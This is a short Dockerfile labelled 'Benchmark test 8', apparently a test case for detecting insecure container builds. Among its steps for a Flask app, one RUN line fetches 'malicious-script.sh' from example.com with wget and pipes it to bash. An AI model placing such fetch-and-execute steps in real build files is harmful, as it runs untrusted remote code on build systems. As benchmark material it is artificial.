# Benchmark test 8
FROM python:3.8-slim
RUN apt-get update && apt-get install -y curl
COPY . /app
WORKDIR /app
RUN pip install flask
RUN wget http://example.com/malicious-script.sh && bash malicious-script.sh
CMD ["python", "app.py"]